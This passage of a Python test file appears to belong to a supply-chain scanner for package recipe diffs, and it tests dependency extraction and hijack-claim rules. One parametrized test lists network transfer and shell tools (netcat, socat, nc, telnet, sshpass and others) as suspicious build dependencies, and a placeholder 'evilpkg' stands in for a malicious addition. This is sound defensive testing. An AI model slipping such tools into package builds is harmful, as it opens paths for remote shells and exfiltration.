+'test_code_setup.py'
+'create-directory'
 )
"""


def test_hunk_boundary_claims_are_validated_against_the_post_recipe():
    """A hunk ending on `optdepends=(` must not adopt the next hunk's
    `source=(...)` entries.  The diff alone cannot tell; the post recipe can."""
    from trustsight.changes import change_delta

    added = extract_dependency_changes(
        _BOUNDARY_DIFF, "demo", current_text=_BOUNDARY_POST
    )
    assert added["depends"] == {"polkit"}
    assert added["optdepends"] == set()

    delta = change_delta(_BOUNDARY_DIFF, "demo", current_text=_BOUNDARY_POST)
    assert delta.added_dependencies["depends"] == ("polkit",)
    assert delta.added_dependencies["optdepends"] == ()


def test_hunk_boundary_phantom_does_not_fire_d001_or_h030(
        seeded_db, enabled, rules):
    record_dependency_names(["polkit"] * 10)
    fact = scan_diff(
        _BOUNDARY_DIFF, rules=rules, config=enabled,
        package_name="demo", current_text=_BOUNDARY_POST,
    )
    ids = {e.rule_id for e in fact.score_breakdown}
    assert "D001" not in ids
    assert "H030" not in ids
    assert fact.dependency_changes.get("optdepends") in (None, [])


def test_post_validation_covers_arch_arrays_and_constraints():
    new = "pkgname=demo\ndepends_x86_64=('libfoo>=1.2')\n"
    diff = HEADER + "+depends_x86_64+=('libfoo>=1.2')\n"
    added = extract_dependency_changes(diff, "demo", current_text=new)
    assert added["depends"] == {"libfoo"}


def test_post_validation_skips_an_unresolved_array():
    """A `$` entry cannot be compared; keeping the claim is the safe side."""
    new = 'pkgname=demo\ndepends=("$dep")\n'
    diff = HEADER + "+depends=('newdep')\n"
    added = extract_dependency_changes(diff, "demo", current_text=new)
    assert added["depends"] == {"newdep"}


def test_post_validation_returns_diff_claims_when_the_recipe_cannot_parse(
        monkeypatch):
    import trustsight.recipedoc as recipedoc

    def boom(_text, **_kwargs):
        raise ValueError("cannot parse")

    monkeypatch.setattr(recipedoc, "parse_recipe", boom)
    diff = HEADER + "+depends=('newdep')\n"
    assert extract_dependency_changes(
        diff, "demo", current_text="pkgname=demo\n"
    )["depends"] == {"newdep"}


def test_d004_does_not_treat_a_conflict_as_a_provides_claim(
        seeded_db, all_enabled, rules):
    """alda: ``conflicts=('icedtea-web')`` documents an incompatibility.

    A conflict refuses co-installation; it does not claim to be or replace
    the name.  H064 reports that shape at its own severity so the hijack
    cluster (D004/H098) stays about actual provides/replaces claims.
    """
    assert "D004" not in fired(
        HEADER + "+conflicts=('openssl')\n", all_enabled, rules)
    assert "D004" in fired(
        HEADER + "+provides=('openssl')\n", all_enabled, rules)


# --- long arrays and post-state validation ---

@pytest.mark.parametrize("count", [59, 60, 100, 200])
def test_a_long_closed_array_keeps_a_late_addition(count):
    """The 60-line bound used to truncate a real meta-package's array."""
    body = "".join(f"  dep{i}\n" for i in range(count))
    diff = HEADER + " depends=(\n" + body + "+  evilpkg\n )\n"
    assert extract_dependency_changes(diff, "mypkg")["depends"] == {"evilpkg"}


def test_an_unterminated_long_array_is_still_dropped():
    """No closer in the diff means the hunk boundary is ambiguous."""
    body = "".join(f"  dep{i}\n" for i in range(100))
    diff = HEADER + (
        " depends=(\n" + body
        + "+  evilpkg\n"
        + "+package() {\n+  if [[ ! -f x ]]; then\n+    echo hi\n+  fi\n+}\n"
    )
    assert extract_dependency_changes(diff, "mypkg")["depends"] == set()


def test_post_validation_resolves_a_scalar_dependency():
    current = (
        "pkgname=mypkg\npkgver=1\npkgrel=1\narch=(any)\n"
        '_lib=libfoo\ndepends=("${_lib}-x")\npackage() { :; }\n'
    )
    diff = HEADER + '+_lib=libfoo\n+depends=("${_lib}-x")\n'
    assert extract_dependency_changes(
        diff, "mypkg", current_text=current
    )["depends"] == {"libfoo-x"}


def test_post_validation_keeps_claims_when_an_entry_is_unresolved():
    current = (
        "pkgname=mypkg\npkgver=1\npkgrel=1\narch=(any)\n"
        'depends=("${unknown}-x" "newdep")\npackage() { :; }\n'
    )
    diff = HEADER + '+depends=("${unknown}-x" "newdep")\n'
    assert "newdep" in extract_dependency_changes(
        diff, "mypkg", current_text=current
    )["depends"]


@pytest.mark.parametrize("tool", [
    "axel", "lftp", "ftp", "tftp", "socat", "netcat", "ncat", "nc",
    "telnet", "sshpass", "openssh",
])
def test_d003_covers_transfer_clients(enabled, rules, tool):
    diff = HEADER + f"+makedepends=('{tool}')\n"
    assert "D003" in fired(diff, enabled, rules)


def test_d005_reports_a_pre_existing_provides_claim(seeded_db, all_enabled, rules):
    """H064/D004 only see a claim that was added; D005 owns the one already
    in the recipe."""
    current = (
        "pkgname=mypkg\npkgver=2\npkgrel=1\narch=(any)\n"
        "provides=('openssl')\npackage() { :; }\n"
    )
    fact = scan_diff(
        HEADER + "-pkgver=1\n+pkgver=2\n", rules=rules, config=all_enabled,
        package_name="mypkg", current_text=current,
    )
    assert "D005" in {e.rule_id for e in fact.score_breakdown}


def test_d005_does_not_double_report_a_new_claim(seeded_db, all_enabled, rules):
    current = (
        "pkgname=mypkg\npkgver=2\npkgrel=1\narch=(any)\n"
        "provides=('openssl')\npackage() { :; }\n"
    )
    fact = scan_diff(
        HEADER + "+provides=('openssl')\n", rules=rules, config=all_enabled,
        package_name="mypkg", current_text=current,
    )
    assert "D005" not in {e.rule_id for e in fact.score_breakdown}
